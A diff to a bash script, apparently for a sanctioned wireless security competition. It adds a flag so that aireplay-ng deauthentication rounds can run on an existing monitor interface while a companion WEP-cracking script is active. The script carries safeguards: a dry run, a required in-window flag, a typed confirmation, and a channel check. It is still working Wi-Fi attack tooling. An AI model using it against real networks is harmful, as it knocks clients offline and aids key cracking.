@@ -15,15 +15,19 @@
 # per client in the file (one MAC per line; # starts a comment). The AP and this card are never targets.
 # The run folder holds deauth.log (every send), aireplay.txt (the raw output), capture-01.cap (the air
 # during the run) and capture-01-health.txt (the same table, printed at the end). Ctrl-C stops the run,
-# and WiFi is restored on exit.
+# and WiFi is restored on exit. With -m, the monitor interface stays up for the run that owns it.
 #
 # --dry-run prints the plan and exits. It needs no root and no card, and sends nothing.
 #
 # Usage:
 #   ./scripts/competition-deauth.sh -b <BSSID> -c <CHANNEL> [-u <HH:MM>] --dry-run
 #   sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <BSSID> -c <CHANNEL> [-u <HH:MM>] --in-window
+#   sudo ./scripts/competition-deauth.sh -m wlp2s0mon -b <BSSID> -c <CHANNEL> [-u <HH:MM>] --in-window
 #
-#   -i  Wi-Fi interface (not needed with --dry-run)
+#   -i  Wi-Fi interface. The run starts monitor mode on it, and restores WiFi on exit
+#   -m  monitor interface that is already up, such as the one wep-crack.sh uses. The run neither
+#       starts nor stops it, nor changes its channel, and leaves it up on exit, so a round can run
+#       during a crack. Give -i or -m, not both. Neither is needed with --dry-run
 #   -b  BSSID of the network to target
 #   -c  the network's channel
 #   -u  optional: HH:MM on this machine's clock: when the window closes. The run stops then.
@@ -61,14 +65,16 @@ done
 set -- "${ARGS[@]}"
 
 IFACE=""
+MONIFACE=""
 BSSID=""
 CHANNEL=""
 CLIENTS=""
 ROUNDS=""
 UNTIL=""
-while getopts ":i:b:c:f:r:u:h" opt; do
+while getopts ":i:m:b:c:f:r:u:h" opt; do
   case "$opt" in
     i) IFACE="$OPTARG" ;;
+    m) MONIFACE="$OPTARG" ;;
     b) BSSID="${OPTARG^^}" ;;
     c) CHANNEL="$OPTARG" ;;
     f) CLIENTS="$OPTARG" ;;
@@ -81,7 +87,8 @@ done
 
 # Everything up to the START prompt runs without root and changes nothing.
 [[ -n "$BSSID" && -n "$CHANNEL" ]] || usage
-(( DRY_RUN )) || [[ -n "$IFACE" ]] || usage
+[[ -z "$IFACE" || -z "$MONIFACE" ]] || die "Give -i or -m, not both: -i starts monitor mode here, -m uses one that is up."
+(( DRY_RUN )) || [[ -n "$IFACE$MONIFACE" ]] || usage
 (( DRY_RUN || IN_WINDOW )) || die "Refusing to run. Pass --in-window, and only while the official evaluation window is open."
 [[ "$BSSID" =~ ^([0-9A-F]{2}:){5}[0-9A-F]{2}$ ]] || die "-b must be a BSSID such as 11:22:33:44:55:66"
 [[ "$CHANNEL" =~ ^[0-9]+$ ]] || die "-c must be a channel number, e.g. 6"
@@ -101,8 +108,8 @@ if [[ -n "$CLIENTS" ]]; then
   IGNORED=$(awk '$1 !~ /^#/ && NF && $1 !~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ { n++ } END { print n + 0 }' "$CLIENTS")
   (( IGNORED == 0 )) || echo "[!] Ignoring $IGNORED line(s) in $CLIENTS that are not MAC addresses."
   (( ${#STATIONS[@]} > 0 )) || die "No client MAC addresses in $CLIENTS"
-  # This card's own address and the AP are never targets.
-  OWN=$(cat "/sys/class/net/${IFACE:-none}/address" 2>/dev/null | tr 'a-f' 'A-F')
+  # This card's own address and the AP are never targets. With -m, the card is the monitor interface.
+  OWN=$(cat "/sys/class/net/${MONIFACE:-${IFACE:-none}}/address" 2>/dev/null | tr 'a-f' 'A-F')
   TARGETS=()
   for sta in "${STATIONS[@]}"; do
     if [[ "$sta" == "$BSSID" || "$sta" == "$OWN" ]]; then
@@ -129,13 +136,23 @@ else
   echo "[*] One round is one call per client: aireplay-ng --deauth $FRAMES -a $BSSID -c <client> <monitor>"
 fi
 
+if [[ -n "$MONIFACE" ]]; then
+  echo "[*] $MONIFACE is already in monitor mode: this run uses it as it is, and leaves it up."
+fi
+
 if (( DRY_RUN )); then
   echo "[*] Dry run: nothing was sent, and the card was not touched."
   exit 0
 fi
 
 wifi_preflight airmon-ng airodump-ng aireplay-ng iw ip nmcli systemctl timeout tshark gawk
-wifi_require_iface "$IFACE"
+if [[ -n "$MONIFACE" ]]; then
+  [[ "$(iface_type "$MONIFACE")" == monitor ]] ||
+    die "$MONIFACE is not in monitor mode, so nothing was sent. Check: iw dev. Or give -i to start monitor mode here."
+  MON=$MONIFACE
+else
+  wifi_require_iface "$IFACE"
+fi
 
 read -r -p "Type START to send deauthentication frames to these targets: " answer || answer=""
 [[ "$answer" == START ]] || die "Cancelled. Nothing was sent."
@@ -146,9 +163,35 @@ AIRMON_LOG="$RUNDIR/airmon.log"
 LOG="$RUNDIR/deauth.log"
 RAW="$RUNDIR/aireplay.txt"
 
-wifi_guard "$IFACE"
-wifi_monitor_start "$IFACE"
-wifi_set_channel "$CHANNEL"
+# Refuses to send unless the monitor interface reads back the channel given with -c.
+check_channel() {
+  local got
+  got=$(iw dev "$MON" info 2>/dev/null | awk '$1 == "channel" { print $2; exit }')
+  if [[ "$got" != "$CHANNEL" ]]; then
+    echo "[!] $MON reports channel '${got:-none}', not $CHANNEL. Nothing was sent." | tee -a "$LOG"
+    exit 1
+  fi
+  echo "[*] $MON reports channel $CHANNEL." | tee -a "$LOG"
+}
+
+wifi_guard "${IFACE:-$MONIFACE}"
+if [[ -n "$MONIFACE" ]]; then
+  # Another run owns this monitor. Set before anything else can exit, so the exit leaves it up.
+  WIFI_SHARED_MONITOR=1
+  echo "[*] Using $MON as it is, already in monitor mode. This run does not start, stop or re-channel it."
+else
+  wifi_monitor_start "$IFACE"
+  wifi_set_channel "$CHANNEL"
+fi
+{
+  echo "# BSSID $BSSID  channel $CHANNEL  frames $FRAMES  pause ${PAUSE}s  call limit ${CALL_LIMIT}s  rounds ${ROUNDS:-no limit}  until ${UNTIL:-Ctrl-C}  start $(date +%F_%T)"
+  echo "# targets: ${TARGETS[*]}"
+} | tee "$LOG"
+
+# With -m, the channel is checked before the run's own capture starts: its airodump-ng -c would
+# move the other run's card if the channel were wrong.
+if [[ -n "$MONIFACE" ]]; then check_channel; fi
+
 # The run's own capture, in the background on the same monitor interface (wep-crack.sh does the same).
 # Nothing is sent unless it is still running a moment later, because without it there is no evidence.
 airodump_start "$RUNDIR/capture" "$CHANNEL" "$BSSID" bg
@@ -157,20 +200,10 @@ REPORT_BSSID="$BSSID"
 sleep 2
 kill -0 "${WIFI_PIDS[-1]}" 2>/dev/null || die "airodump-ng stopped at once, so there is no capture. Nothing was sent."
 
-{
-  echo "# BSSID $BSSID  channel $CHANNEL  frames $FRAMES  pause ${PAUSE}s  call limit ${CALL_LIMIT}s  rounds ${ROUNDS:-no limit}  until ${UNTIL:-Ctrl-C}  start $(date +%F_%T)"
-  echo "# targets: ${TARGETS[*]}"
-} | tee "$LOG"
-
 # aireplay-ng cannot read this card's channel (it reports -1), so the tool runs it with
 # --ignore-negative-one. That is only safe if the card is on the requested channel and the run's own
 # capture hears the AP, so both are checked here, before the first call.
-GOT_CHANNEL=$(iw dev "$MON" info 2>/dev/null | awk '$1 == "channel" { print $2; exit }')
-if [[ "$GOT_CHANNEL" != "$CHANNEL" ]]; then
-  echo "[!] $MON reports channel '${GOT_CHANNEL:-none}', not $CHANNEL. Nothing was sent." | tee -a "$LOG"
-  exit 1
-fi
-echo "[*] $MON reports channel $CHANNEL." | tee -a "$LOG"
+check_channel
 heard=0
 for _ in {1..10}; do
   if awk -F', *' -v b="$BSSID" 'toupper($1) == b && $10 + 0 > 0 { found = 1 } END { exit !found }' "$RUNDIR/capture-01.csv" 2>/dev/null; then
